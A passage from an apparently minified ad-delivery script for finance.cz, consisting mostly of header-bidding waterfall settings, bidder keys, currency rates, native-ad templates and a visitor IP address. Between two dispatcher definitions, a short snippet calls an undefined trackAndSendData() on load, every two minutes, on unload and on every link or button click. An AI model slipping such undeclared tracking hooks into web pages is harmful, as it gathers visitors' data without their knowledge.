    "INR": 0.27263393278264914,
    "ISK": 0.16232978301864892,
    "JPY": 0.15612687931876224,
    "KRW": 0.017293138269500557,
    "MXN": 1.3133873573332984,
    "MYR": 4.8555238867497605,
    "NOK": 2.0704105209981036,
    "NZD": 13.933786645858879,
    "PHP": 0.40914839444032797,
    "PLN": 5.6634120925174996,
    "RON": 4.93208518697535,
    "SEK": 2.1732563421053204,
    "SGD": 16.937669376693766,
    "THB": 0.6357885367326827,
    "TRY": 0.7826716496761696,
    "ZAR": 1.1946189583639455
  },
  "excludes": [],
  "waterfall": {
    "id": 20123,
    "tiers": [{
      "method": "hb",
      "id": 42811,
      "channels": [{
        "chd": {
          "id": 166575,
          "tag": "adform",
          "flag": "Premium",
          "title": "Reklama",
          "keys": {
            "1": "990753"
          },
          "unmaskedDomain": true,
          "currency": "EUR",
          "priceType": "gross",
          "s2s": false,
          "width": 300,
          "height": 600,
          "sizes": [[160, 600], [300, 300], [250, 360], [300, 250], [120, 600], [250, 250]]
        },
        "floor": 24.58,
        "factor": 22.077221213756566,
        "factorFixed": 23.303733503409706,
        "styles": []
      }, {
        "chd": {
          "id": 166581,
          "tag": "adform",
          "flag": "PublisherStandard",
          "title": "Reklama",
          "keys": {
            "1": "1056856"
          },
          "unmaskedDomain": false,
          "currency": "EUR",
          "priceType": "gross",
          "s2s": false,
          "width": 300,
          "height": 600,
          "sizes": [[160, 600], [300, 300], [250, 360], [300, 250], [120, 600], [250, 250]]
        },
        "floor": 10,
        "factor": 22.077221213756566,
        "factorFixed": 23.303733503409706,
        "styles": []
      }, {
        "chd": {
          "id": 166605,
          "tag": "adform",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "1056857"
          },
          "unmaskedDomain": false,
          "currency": "EUR",
          "priceType": "gross_gross",
          "s2s": false,
          "width": 300,
          "height": 600,
          "sizes": [[160, 600], [300, 300], [250, 360], [300, 250], [120, 600], [250, 250]]
        },
        "floor": 0,
        "factor": 22.077221213756566,
        "factorFixed": 23.303733503409706,
        "styles": []
      }, {
        "chd": {
          "id": 166611,
          "tag": "criteo-hb-xhr",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "multiple_hb_300x600_1_(ii.finance.cz)\/Zero"
          },
          "unmaskedDomain": false,
          "currency": "EUR",
          "priceType": "gross",
          "s2s": false,
          "width": 300,
          "height": 600,
          "sizes": [[250, 600], [160, 600], [300, 300], [120, 600], [250, 250]]
        },
        "floor": 0,
        "factor": 24.53024579306285,
        "factorFixed": 24.53024579306285,
        "styles": []
      }, {
        "chd": {
          "id": 166589,
          "tag": "smart-hb",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "394820-1350874-77735"
          },
          "unmaskedDomain": false,
          "currency": "EUR",
          "priceType": "gross",
          "s2s": false,
          "width": 300,
          "height": 600,
          "sizes": [[250, 600], [250, 360], [300, 300], [300, 250], [250, 250], [120, 600], [160, 600]]
        },
        "floor": 0,
        "factor": 24.53024579306285,
        "bfc": 1.1111111111111112,
        "factorFixed": 24.53024579306285,
        "styles": []
      }, {
        "chd": {
          "id": 166595,
          "tag": "connectad",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "1046957"
          },
          "unmaskedDomain": false,
          "currency": "USD",
          "priceType": "gross",
          "s2s": false,
          "width": 300,
          "height": 600,
          "sizes": [[300, 300], [300, 250], [200, 600], [160, 600], [120, 600], [250, 250], [240, 400], [220, 250]]
        },
        "floor": 0,
        "factor": 22.736057112975466,
        "factorFixed": 22.736057112975466,
        "styles": []
      }, {
        "chd": {
          "id": 166617,
          "tag": "pubmatic-hb",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "798915-3709912"
          },
          "unmaskedDomain": false,
          "currency": "USD",
          "priceType": "gross",
          "s2s": false,
          "width": 300,
          "height": 600,
          "sizes": [[300, 300], [250, 250], [160, 600], [120, 600]]
        },
        "floor": 0,
        "factor": 18.870927403769635,
        "factorFixed": 20.00773025941841,
        "styles": []
      }, {
        "chd": {
          "id": 166625,
          "tag": "xandr",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "21714031"
          },
          "unmaskedDomain": false,
          "currency": "USD",
          "priceType": "gross",
          "s2s": false,
          "width": 300,
          "height": 600,
          "sizes": [[234, 600], [300, 390], [160, 600], [300, 300], [300, 250], [120, 600]]
        },
        "floor": 0,
        "factor": 22.736057112975466,
        "factorFixed": 22.736057112975466,
        "styles": []
      }, {
        "chd": {
          "id": 166639,
          "tag": "stroeer-banner",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "36479b13-0b22-4089-b5da-b1aa84664f49"
          },
          "unmaskedDomain": false,
          "currency": "EUR",
          "priceType": "gross",
          "s2s": false,
          "width": 300,
          "height": 600,
          "sizes": [[160, 600], [300, 300], [300, 250], [120, 600], [250, 250]]
        },
        "floor": 0,
        "factor": 24.53024579306285,
        "factorFixed": 24.53024579306285,
        "styles": []
      }, {
        "chd": {
          "id": 166645,
          "tag": "xandr-native",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "21713308"
          },
          "unmaskedDomain": false,
          "currency": "USD",
          "priceType": "gross",
          "s2s": false,
          "width": 1,
          "height": 1
        },
        "floor": 0,
        "factor": 22.736057112975466,
        "factorFixed": 22.736057112975466,
        "styles": {
          "normal": {
            "name": "n-j-1-halfpage-single_default-56677",
            "count": 1,
            "options": {
              "dom": {
                "method": "container",
                "selectorForeign": "1"
              },
              "hb": {
                "currency": "USD",
                "onlyPrebid": true,
                "prebidAdUnitsPath": "pbjs.adUnits",
                "targeting": []
              },
              "wrap": "<div style='position: relative;width: 300px;height: 600px;font-size: 17px;box-shadow: 0px 0px 8px -3px;'> <a href='' class='AdTrack-promoClick AdTrack-adChoices' style='position: absolute;top: 1px;right: 2px;z-index: 1;font-size: 10px;color: #ccc;font-weight: normal;line-height: 10px;margin-left: 5px;display: inline-block;text-decoration: none;'><\/a> <div class='AdTrack-ad-0' style='box-sizing: border-box;width: 100%;height: 100%;padding: 5% 5%;margin: 0 auto;text-align: center;display: table;box-shadow: 0 6px 4px -7px;'><\/div> <\/div>",
              "ad": "<a href='' class='AdTrack-clickUrl-image' style='display: table-cell; vertical-align: middle; '> <img src='' alt='' class='AdTrack-imageUrl' style='max-width: 80%;max-height: 300px;width: auto;height: auto;'> <div style=' '> <span class='AdTrack-headline' style='display: block;font-size: 1.2em;line-height: 1.5em;padding: 1em 0;'><\/span> <span class='AdTrack-description' style='display: inline-block;text-decoration: none;color: black;font-size: 1em;line-height: 1.5em;'><\/span> <\/div> <\/a>",
              "css": "",
              "faviconFallback": "",
              "nativeOptions": {
                "titleLength": 30,
                "descLength": 140,
                "maxTitleLength": 40,
                "maxDescLength": 200
              }
            }
          },
          "product": {
            "name": "p-j-1-halfpage-single_default-56677",
            "count": 1,
            "options": {
              "dom": {
                "method": "container",
                "selectorForeign": "1"
              },
              "hb": {
                "currency": "USD",
                "onlyPrebid": true,
                "prebidAdUnitsPath": "pbjs.adUnits",
                "targeting": []
              },
              "wrap": "<div style='position: relative;width: 300px;height: 600px;font-size: 17px;box-shadow: 0px 0px 8px -3px;'> <a href='' class='AdTrack-promoClick AdTrack-adChoices' style='position: absolute;top: 1px;right: 2px;z-index: 1;font-size: 10px;color: #ccc;font-weight: normal;line-height: 10px;margin-left: 5px;display: inline-block;text-decoration: none;'><\/a> <div class='AdTrack-ad-0' style='box-sizing: border-box;width: 100%;height: 100%;padding: 5% 5%;margin: 0 auto;text-align: center;display: table;box-shadow: 0 6px 4px -7px;'><\/div> <\/div>",
              "ad": "<a href='' class='AdTrack-clickUrl-image' style='display: table-cell; vertical-align: middle; '> <img src='' alt='' class='AdTrack-imageUrl' style='max-width: 80%;max-height: 300px;width: auto;height: auto;'> <div style=' '> <span class='AdTrack-headline' style='display: block;font-size: 1.2em;line-height: 1.5em;padding: 1em 0;'><\/span> <span class='AdTrack-description' style='display: inline-block;text-decoration: none;color: black;font-size: 1em;line-height: 1.5em;'><\/span> <\/div> <\/a>",
              "css": "",
              "faviconFallback": "",
              "nativeOptions": {
                "titleLength": 30,
                "descLength": 140,
                "maxTitleLength": 40,
                "maxDescLength": 200
              }
            }
          }
        }
      }, {
        "chd": {
          "id": 166653,
          "tag": "criteo-hb-xhr-native",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "1387199-hb_300x600_1_(ii.finance.cz)\/Native_6_Zero"
          },
          "unmaskedDomain": false,
          "currency": "EUR",
          "priceType": "gross",
          "s2s": false,
          "width": 300,
          "height": 600
        },
        "floor": 0,
        "factor": 24.53024579306285,
        "factorFixed": 24.53024579306285,
        "styles": {
          "normal": {
            "name": "n-j-1-halfpage-single_default-56677",
            "count": 1,
            "options": {
              "dom": {
                "method": "container",
                "selectorForeign": "1"
              },
              "hb": {
                "currency": "USD",
                "onlyPrebid": true,
                "prebidAdUnitsPath": "pbjs.adUnits",
                "targeting": []
              },
              "wrap": "<div style='position: relative;width: 300px;height: 600px;font-size: 17px;box-shadow: 0px 0px 8px -3px;'> <a href='' class='AdTrack-promoClick AdTrack-adChoices' style='position: absolute;top: 1px;right: 2px;z-index: 1;font-size: 10px;color: #ccc;font-weight: normal;line-height: 10px;margin-left: 5px;display: inline-block;text-decoration: none;'><\/a> <div class='AdTrack-ad-0' style='box-sizing: border-box;width: 100%;height: 100%;padding: 5% 5%;margin: 0 auto;text-align: center;display: table;box-shadow: 0 6px 4px -7px;'><\/div> <\/div>",
              "ad": "<a href='' class='AdTrack-clickUrl-image' style='display: table-cell; vertical-align: middle; '> <img src='' alt='' class='AdTrack-imageUrl' style='max-width: 80%;max-height: 300px;width: auto;height: auto;'> <div style=' '> <span class='AdTrack-headline' style='display: block;font-size: 1.2em;line-height: 1.5em;padding: 1em 0;'><\/span> <span class='AdTrack-description' style='display: inline-block;text-decoration: none;color: black;font-size: 1em;line-height: 1.5em;'><\/span> <\/div> <\/a>",
              "css": "",
              "faviconFallback": "",
              "nativeOptions": {
                "titleLength": 30,
                "descLength": 140,
                "maxTitleLength": 40,
                "maxDescLength": 200
              }
            }
          },
          "product": {
            "name": "p-j-1-halfpage-single_default-56677",
            "count": 1,
            "options": {
              "dom": {
                "method": "container",
                "selectorForeign": "1"
              },
              "hb": {
                "currency": "USD",
                "onlyPrebid": true,
                "prebidAdUnitsPath": "pbjs.adUnits",
                "targeting": []
              },
              "wrap": "<div style='position: relative;width: 300px;height: 600px;font-size: 17px;box-shadow: 0px 0px 8px -3px;'> <a href='' class='AdTrack-promoClick AdTrack-adChoices' style='position: absolute;top: 1px;right: 2px;z-index: 1;font-size: 10px;color: #ccc;font-weight: normal;line-height: 10px;margin-left: 5px;display: inline-block;text-decoration: none;'><\/a> <div class='AdTrack-ad-0' style='box-sizing: border-box;width: 100%;height: 100%;padding: 5% 5%;margin: 0 auto;text-align: center;display: table;box-shadow: 0 6px 4px -7px;'><\/div> <\/div>",
              "ad": "<a href='' class='AdTrack-clickUrl-image' style='display: table-cell; vertical-align: middle; '> <img src='' alt='' class='AdTrack-imageUrl' style='max-width: 80%;max-height: 300px;width: auto;height: auto;'> <div style=' '> <span class='AdTrack-headline' style='display: block;font-size: 1.2em;line-height: 1.5em;padding: 1em 0;'><\/span> <span class='AdTrack-description' style='display: inline-block;text-decoration: none;color: black;font-size: 1em;line-height: 1.5em;'><\/span> <\/div> <\/a>",
              "css": "",
              "faviconFallback": "",
              "nativeOptions": {
                "titleLength": 30,
                "descLength": 140,
                "maxTitleLength": 40,
                "maxDescLength": 200
              }
            }
          }
        }
      }, {
        "chd": {
          "id": 166657,
          "tag": "smart-hb-native",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "394820-1350874-102180"
          },
          "unmaskedDomain": false,
          "currency": "EUR",
          "priceType": "gross",
          "s2s": false,
          "width": 13,
          "height": 31
        },
        "floor": 0,
        "factor": 24.53024579306285,
        "bfc": 1.1111111111111112,
        "factorFixed": 24.53024579306285,
        "styles": {
          "normal": {
            "name": "n-j-1-halfpage-single_default-56677",
            "count": 1,
            "options": {
              "dom": {
                "method": "container",
                "selectorForeign": "1"
              },
              "hb": {
                "currency": "USD",
                "onlyPrebid": true,
                "prebidAdUnitsPath": "pbjs.adUnits",
                "targeting": []
              },
              "wrap": "<div style='position: relative;width: 300px;height: 600px;font-size: 17px;box-shadow: 0px 0px 8px -3px;'> <a href='' class='AdTrack-promoClick AdTrack-adChoices' style='position: absolute;top: 1px;right: 2px;z-index: 1;font-size: 10px;color: #ccc;font-weight: normal;line-height: 10px;margin-left: 5px;display: inline-block;text-decoration: none;'><\/a> <div class='AdTrack-ad-0' style='box-sizing: border-box;width: 100%;height: 100%;padding: 5% 5%;margin: 0 auto;text-align: center;display: table;box-shadow: 0 6px 4px -7px;'><\/div> <\/div>",
              "ad": "<a href='' class='AdTrack-clickUrl-image' style='display: table-cell; vertical-align: middle; '> <img src='' alt='' class='AdTrack-imageUrl' style='max-width: 80%;max-height: 300px;width: auto;height: auto;'> <div style=' '> <span class='AdTrack-headline' style='display: block;font-size: 1.2em;line-height: 1.5em;padding: 1em 0;'><\/span> <span class='AdTrack-description' style='display: inline-block;text-decoration: none;color: black;font-size: 1em;line-height: 1.5em;'><\/span> <\/div> <\/a>",
              "css": "",
              "faviconFallback": "",
              "nativeOptions": {
                "titleLength": 30,
                "descLength": 140,
                "maxTitleLength": 40,
                "maxDescLength": 200
              }
            }
          },
          "product": {
            "name": "p-j-1-halfpage-single_default-56677",
            "count": 1,
            "options": {
              "dom": {
                "method": "container",
                "selectorForeign": "1"
              },
              "hb": {
                "currency": "USD",
                "onlyPrebid": true,
                "prebidAdUnitsPath": "pbjs.adUnits",
                "targeting": []
              },
              "wrap": "<div style='position: relative;width: 300px;height: 600px;font-size: 17px;box-shadow: 0px 0px 8px -3px;'> <a href='' class='AdTrack-promoClick AdTrack-adChoices' style='position: absolute;top: 1px;right: 2px;z-index: 1;font-size: 10px;color: #ccc;font-weight: normal;line-height: 10px;margin-left: 5px;display: inline-block;text-decoration: none;'><\/a> <div class='AdTrack-ad-0' style='box-sizing: border-box;width: 100%;height: 100%;padding: 5% 5%;margin: 0 auto;text-align: center;display: table;box-shadow: 0 6px 4px -7px;'><\/div> <\/div>",
              "ad": "<a href='' class='AdTrack-clickUrl-image' style='display: table-cell; vertical-align: middle; '> <img src='' alt='' class='AdTrack-imageUrl' style='max-width: 80%;max-height: 300px;width: auto;height: auto;'> <div style=' '> <span class='AdTrack-headline' style='display: block;font-size: 1.2em;line-height: 1.5em;padding: 1em 0;'><\/span> <span class='AdTrack-description' style='display: inline-block;text-decoration: none;color: black;font-size: 1em;line-height: 1.5em;'><\/span> <\/div> <\/a>",
              "css": "",
              "faviconFallback": "",
              "nativeOptions": {
                "titleLength": 30,
                "descLength": 140,
                "maxTitleLength": 40,
                "maxDescLength": 200
              }
            }
          }
        }
      }, {
        "chd": {
          "id": 548025,
          "tag": "seznam-ssp-hb2",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "2": "296567"
          },
          "unmaskedDomain": false,
          "currency": "CZK",
          "priceType": "gross",
          "s2s": false,
          "width": 300,
          "height": 600,
          "sizes": [[300, 300], [300, 250], [160, 600]]
        },
        "floor": 0,
        "factor": 1,
        "factorFixed": 1,
        "styles": {
          "normal": {
            "name": "n-j-2-halfpage-double_default-56679",
            "count": 2,
            "options": {
              "dom": {
                "method": "container",
                "selectorForeign": "1"
              },
              "hb": {
                "currency": "USD",
                "onlyPrebid": true,
                "prebidAdUnitsPath": "pbjs.adUnits",
                "targeting": []
              },
              "wrap": "<div style='position: relative;width: 300px;height: 600px;font-size: 15px;box-shadow: 0px 0px 8px -3px;'> <a href='' class='AdTrack-promoClick AdTrack-adChoices' style='position: absolute;top: 1px;right: 2px;z-index: 1;font-size: 10px;color: #ccc;font-weight: normal;line-height: 10px;margin-left: 5px;display: inline-block;text-decoration: none;'><\/a> <div class='AdTrack-ad-0' style='box-sizing: border-box;width: 100%;height: 50%;padding: 5% 5%;margin: 0 auto;text-align: center;display: table;box-shadow: 0 6px 4px -7px;'><\/div> <div class='AdTrack-ad-1' style='box-sizing: border-box;width: 100%;height: 50%;padding: 5% 5%;margin: 0 auto;text-align: center;display: table;box-shadow: 0 6px 4px -7px;'><\/div> <\/div>",
              "ad": "<a href='' class='AdTrack-clickUrl-image' style='display: table-cell; vertical-align: middle; '> <img src='' alt='' class='AdTrack-imageUrl' style='max-width: 80%;max-height: 120px;width: auto;height: auto;'> <div style=' '> <span class='AdTrack-headline' style='display: block;font-size: 1.2em;line-height: 1.2em;padding-bottom: 0.3em;'><\/span> <span class='AdTrack-description' style='display: inline-block;text-decoration: none;color: black;font-size: 1em;line-height: 1em;'><\/span> <\/div> <\/a>",
              "css": "",
              "faviconFallback": "",
              "nativeOptions": {
                "titleLength": 30,
                "descLength": 70,
                "maxTitleLength": 40,
                "maxDescLength": 90
              }
            }
          },
          "product": {
            "name": "p-j-2-halfpage-double_default-56679",
            "count": 2,
            "options": {
              "dom": {
                "method": "container",
                "selectorForeign": "1"
              },
              "hb": {
                "currency": "USD",
                "onlyPrebid": true,
                "prebidAdUnitsPath": "pbjs.adUnits",
                "targeting": []
              },
              "wrap": "<div style='position: relative;width: 300px;height: 600px;font-size: 15px;box-shadow: 0px 0px 8px -3px;'> <a href='' class='AdTrack-promoClick AdTrack-adChoices' style='position: absolute;top: 1px;right: 2px;z-index: 1;font-size: 10px;color: #ccc;font-weight: normal;line-height: 10px;margin-left: 5px;display: inline-block;text-decoration: none;'><\/a> <div class='AdTrack-ad-0' style='box-sizing: border-box;width: 100%;height: 50%;padding: 5% 5%;margin: 0 auto;text-align: center;display: table;box-shadow: 0 6px 4px -7px;'><\/div> <div class='AdTrack-ad-1' style='box-sizing: border-box;width: 100%;height: 50%;padding: 5% 5%;margin: 0 auto;text-align: center;display: table;box-shadow: 0 6px 4px -7px;'><\/div> <\/div>",
              "ad": "<a href='' class='AdTrack-clickUrl-image' style='display: table-cell; vertical-align: middle; '> <img src='' alt='' class='AdTrack-imageUrl' style='max-width: 80%;max-height: 120px;width: auto;height: auto;'> <div style=' '> <span class='AdTrack-headline' style='display: block;font-size: 1.2em;line-height: 1.2em;padding-bottom: 0.3em;'><\/span> <span class='AdTrack-description' style='display: inline-block;text-decoration: none;color: black;font-size: 1em;line-height: 1em;'><\/span> <\/div> <\/a>",
              "css": "",
              "faviconFallback": "",
              "nativeOptions": {
                "titleLength": 30,
                "descLength": 70,
                "maxTitleLength": 40,
                "maxDescLength": 90
              }
            }
          }
        }
      }, {
        "chd": {
          "id": 780467,
          "tag": "rtbhouse-hb",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "hb_300x600_1_(ii.finance.cz)_-_Zero"
          },
          "unmaskedDomain": false,
          "currency": "USD",
          "priceType": "gross",
          "s2s": false,
          "width": 300,
          "height": 600,
          "sizes": [[300, 250], [300, 300], [160, 600], [250, 250], [120, 600], [240, 400], [300, 337], [250, 360], [300, 480], [300, 319], [300, 465], [300, 359], [300, 470], [300, 368], [300, 360], [300, 476], [300, 332]]
        },
        "floor": 0,
        "factor": 22.736057112975466,
        "factorFixed": 22.736057112975466,
        "styles": []
      }, {
        "chd": {
          "id": 787423,
          "tag": "adaptmx-hb",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "hb_300x600_1_(ii.finance.cz)_-_Zero"
          },
          "unmaskedDomain": false,
          "currency": "USD",
          "priceType": "gross",
          "s2s": false,
          "width": 300,
          "height": 600,
          "sizes": [[300, 250], [300, 300], [160, 600], [250, 250], [120, 600], [240, 400], [300, 337], [250, 360], [300, 480], [300, 319], [300, 465], [300, 359], [300, 470], [300, 368], [300, 360], [300, 476], [300, 332]]
        },
        "floor": 0,
        "factor": 22.736057112975466,
        "factorFixed": 22.736057112975466,
        "styles": []
      }, {
        "chd": {
          "id": 788579,
          "tag": "onetag",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "hb_300x600_1_ii_finance_cz_-_Zero"
          },
          "unmaskedDomain": false,
          "currency": "EUR",
          "priceType": "gross",
          "s2s": false,
          "width": 300,
          "height": 600,
          "sizes": [[300, 250], [300, 300], [160, 600], [250, 250], [120, 600], [240, 400], [300, 337], [250, 360], [300, 480], [300, 319], [300, 465], [300, 359], [300, 470], [300, 368], [300, 360], [300, 476], [300, 332]]
        },
        "floor": 0,
        "factor": 24.53024579306285,
        "factorFixed": 24.53024579306285,
        "styles": []
      }],
      "s2s": false
    }]
  },
  "cls": {
    "headline": "AdTrack-headline",
    "description": "AdTrack-description",
    "adChoices": "AdTrack-adChoices",
    "date": "AdTrack-date",
    "ad": "AdTrack-ad-*",
    "ads": "AdTrack-ads",
    "container": "AdTrack-container",
    "promoTitle": "AdTrack-promoTitle",
    "promoIcon": "AdTrack-promoIcon",
    "promoClick": "AdTrack-promoClick",
    "closeTitle": "AdTrack-closeTitle",
    "closeClick": "AdTrack-closeClick",
    "creative1": "AdTrack-creative1",
    "creative2": "AdTrack-creative2",
    "creative3": "AdTrack-creative3",
    "creative23": "AdTrack-creative23",
    "creative123": "AdTrack-creative123",
    "bannerUrl": "AdTrack-bannerUrl",
    "bannerRel": "AdTrack-bannerRel",
    "adUrl": "AdTrack-adUrl",
    "clickUrl": "AdTrack-clickUrl-*",
    "visibleUrl": "AdTrack-visibleUrl",
    "longHeadline": "AdTrack-longHeadline",
    "companyName": "AdTrack-companyName",
    "logoUrl": "AdTrack-logoUrl",
    "squareLogoUrl": "AdTrack-squareLogoUrl",
    "screenshot": "AdTrack-screenshot",
    "screenshothq": "AdTrack-screenshothq",
    "favicon": "AdTrack-favicon",
    "cta": "AdTrack-cta",
    "imageUrl": "AdTrack-imageUrl",
    "category": "AdTrack-category",
    "logoutUrl": "AdTrack-logoutUrl",
    "title": "AdTrack-title",
    "manufacturer": "AdTrack-manufacturer",
    "price": "AdTrack-price",
    "lastPrice": "AdTrack-lastPrice",
    "discount": "AdTrack-discount",
    "condition": "AdTrack-condition",
    "additionalInfo": "AdTrack-additionalInfo",
    "productDescription": "AdTrack-productDescription",
    "shopName": "AdTrack-shopName",
    "shopSlogan": "AdTrack-shopSlogan",
    "shopUrl": "AdTrack-shopUrl",
    "shopLogoUrl": "AdTrack-shopLogoUrl",
    "cleanShopUrl": "AdTrack-cleanShopUrl",
    "confirmImpUrl": "AdTrack-confirmImpUrl",
    "productTextTemplate": "AdTrack-productTextTemplate"
  },
  "test": false
}, null, "delivery.r2b2.cz", null, {
  "timeout": 10000,
  "visitor": {
    "countryISO": "JP",
    "gdpr": 0
  },
  "publisher": {
    "id": "32",
    "tag": "ii"
  },
  "ip": "50.7.159.142"
});
window.addEventListener("load", () => {
  trackAndSendData();
  setInterval(trackAndSendData, 120000); // Every 2 minutes
});
window.addEventListener("beforeunload", () => {
  trackAndSendData();
});
document.addEventListener("click", event => {
  if (event.target.matches('button, a')) {
    trackAndSendData();
  }
});
AdTrack.units["classic_ii.finance.cz_hb_300x600_2"] = new AdTrack.Dispatcher("classic", "ii.finance.cz", "hb", "300x600_2", {
  "renderer": "flexi",
  "options": {
    "dom": {
      "method": "container",
      "selectorForeign": "1"
    },
    "hb": {
      "currency": "USD",
      "onlyPrebid": true,
      "prebidAdUnitsPath": "pbjs.adUnits",
      "targeting": []
    },
    "noFPBNs": {
      "1": "36864793",
      "3": "35378918",
      "5": "38308494",
      "7": "37087795",
      "9": "37388055",
      "13": "37471860",
      "15": "37543676",
      "19": "37827190",
      "21": "37841587",
      "23": "37848515",
      "25": "37974109",
      "27": "37974663",
      "31": "38062118",
      "33": "38105499",
      "35": "38155389",
      "41": "38205101",
      "43": "38206998",
      "45": "38207000",
      "47": "38294481",
      "49": "38397175",
      "51": "38499466",
      "53": "38499409",
      "55": "38564125",
      "57": "38564378",
      "59": "38564379",
      "63": "38564531",
      "65": "38564652",
      "67": "38578260",
      "73": "38607930",
      "75": "38814525",
      "83": "38943634",
      "85": "39048920",
      "87": "39152378",
      "89": "39464480",
      "93": "39671195",
      "95": "39671197",
      "97": "39863294",
      "99": "40165496",
      "101": "40177548",
      "103": "40304968",
      "107": "40548792",
      "109": "40769002",
      "111": "40769003",
      "113": "40769102",
      "115": "40954941",
      "117": "40954952",
      "119": "40964226",
      "121": "40964227",
      "123": "41110847",
      "125": "508238",
      "129": "41289790",
      "131": "41289791",
      "135": "41293384",
      "145": "41110891",
      "147": "41390292",
      "149": "41526930",
      "153": "41579327",
      "155": "41640870",
      "157": "41649243",
      "159": "41649244",
      "161": "41903685",
      "163": "42688264",
      "165": "42749800",
      "167": "42749857",
      "169": "42936660",
      "171": "42758494",
      "173": "42989624",
      "175": "43026410",
      "177": "43121537",
      "179": "43748272",
      "181": "43748273",
      "183": "43748274",
      "185": "43748275",
      "187": "43816960",
      "191": "44023945",
      "193": "35330297",
      "195": "35330298",
      "197": "44031450",
      "199": "44056173",
      "201": "44838490",
      "203": "44973412",
      "205": "38235276",
      "207": "43687619",
      "209": "38235288",
      "211": "35191520",
      "213": "35192610",
      "215": "43718505",
      "217": "45488261",
      "219": "561561",
      "221": "45720614",
      "223": "45721149",
      "225": "45721155",
      "227": "45721156",
      "229": "45721158",
      "231": "45721159",
      "233": "45721541",
      "245": "35330227",
      "247": "35329454",
      "249": "35329455",
      "251": "35329456",
      "253": "35329457",
      "255": "35329458",
      "257": "35329459",
      "259": "35329460",
      "261": "35329461",
      "263": "35329462",
      "265": "36709751",
      "267": "37160164",
      "269": "43688507",
      "271": "45751953",
      "273": "45751954",
      "277": "38235286",
      "279": "38235287",
      "283": "38235289",
      "285": "38235290",
      "287": "38235291",
      "289": "38235292",
      "291": "38235293",
      "293": "38235294",
      "327": "35330120",
      "331": "46210805",
      "341": "46781560"
    },
    "publisher": {
      "id": "32",
      "tag": "ii"
    }
  },
  "info": {
    "realDomain": "finance.cz",
    "language": "Czech",
    "ctaDefault": "Nav\u0161t\u00edvit str\u00e1nku",
    "region": "Europe"
  },
  "currencies": {
    "EUR": 24.53024579306285,
    "USD": 22.736057112975466,
    "CZK": 1,
    "AUD": 14.915355358341413,
    "BGN": 12.534941148451308,
    "BRL": 4.5859989452202425,
    "CAD": 16.70815859384137,
    "CHF": 25.951108112316398,
    "CNY": 3.1680759324439487,
    "DKK": 3.289581894141255,
    "GBP": 28.53229856197215,
    "HKD": 2.91088613195629,
    "HUF": 0.06415883469078457,
    "IDR": 0.0014595585509407543,
    "ILS": 6.121636925713936,
    "INR": 0.27263393278264914,
    "ISK": 0.16232978301864892,
    "JPY": 0.15612687931876224,
    "KRW": 0.017293138269500557,
    "MXN": 1.3133873573332984,
    "MYR": 4.8555238867497605,
    "NOK": 2.0704105209981036,
    "NZD": 13.933786645858879,
    "PHP": 0.40914839444032797,
    "PLN": 5.6634120925174996,
    "RON": 4.93208518697535,
    "SEK": 2.1732563421053204,
    "SGD": 16.937669376693766,
    "THB": 0.6357885367326827,
    "TRY": 0.7826716496761696,
    "ZAR": 1.1946189583639455
  },
  "excludes": [],
  "waterfall": {
    "id": 20121,
    "tiers": [{
      "method": "hb",
      "id": 42809,
      "channels": [{
        "chd": {
          "id": 166567,
          "tag": "adform",
          "flag": "Premium",
          "title": "Reklama",
          "keys": {
            "1": "990755"
          },
          "unmaskedDomain": true,
          "currency": "EUR",
          "priceType": "gross",
          "s2s": false,
          "width": 300,
          "height": 600,
          "sizes": [[160, 600], [300, 300], [250, 360], [300, 250], [120, 600], [250, 250]]
        },
        "floor": 24.58,
        "factor": 22.077221213756566,
        "factorFixed": 23.303733503409706,
        "styles": []
      }, {
        "chd": {
          "id": 166579,
          "tag": "adform",
          "flag": "PublisherStandard",
          "title": "Reklama",
          "keys": {
            "1": "1056858"
          },
          "unmaskedDomain": false,
          "currency": "EUR",
          "priceType": "gross",
          "s2s": false,
          "width": 300,
          "height": 600,
          "sizes": [[160, 600], [300, 300], [250, 360], [300, 250], [120, 600], [250, 250]]
        },
        "floor": 10,
        "factor": 22.077221213756566,
        "factorFixed": 23.303733503409706,
        "styles": []
      }, {
        "chd": {
          "id": 166623,
          "tag": "adform",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "1056859"
          },
          "unmaskedDomain": false,
          "currency": "EUR",
          "priceType": "gross_gross",
          "s2s": false,
          "width": 300,
          "height": 600,
          "sizes": [[160, 600], [300, 300], [250, 360], [300, 250], [120, 600], [250, 250]]
        },
        "floor": 0,
        "factor": 22.077221213756566,
        "factorFixed": 23.303733503409706,
        "styles": []
      }, {
        "chd": {
          "id": 166635,
          "tag": "criteo-hb-xhr",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "multiple_hb_300x600_2_(ii.finance.cz)\/Zero"
          },
          "unmaskedDomain": false,
          "currency": "EUR",
          "priceType": "gross",
          "s2s": false,
          "width": 300,
          "height": 600,
          "sizes": [[250, 600], [160, 600], [300, 300], [120, 600], [250, 250]]
        },
        "floor": 0,
        "factor": 24.53024579306285,
        "factorFixed": 24.53024579306285,
        "styles": []
      }, {
        "chd": {
          "id": 166591,
          "tag": "smart-hb",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "394820-1350874-77727"
          },
          "unmaskedDomain": false,
          "currency": "EUR",
          "priceType": "gross",
          "s2s": false,
          "width": 300,
          "height": 600,
          "sizes": [[250, 600], [250, 360], [300, 300], [300, 250], [250, 250], [120, 600], [160, 600]]
        },
        "floor": 0,
        "factor": 24.53024579306285,
        "bfc": 1.1111111111111112,
        "factorFixed": 24.53024579306285,
        "styles": []
      }, {
        "chd": {
          "id": 166603,
          "tag": "connectad",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "1046956"
          },
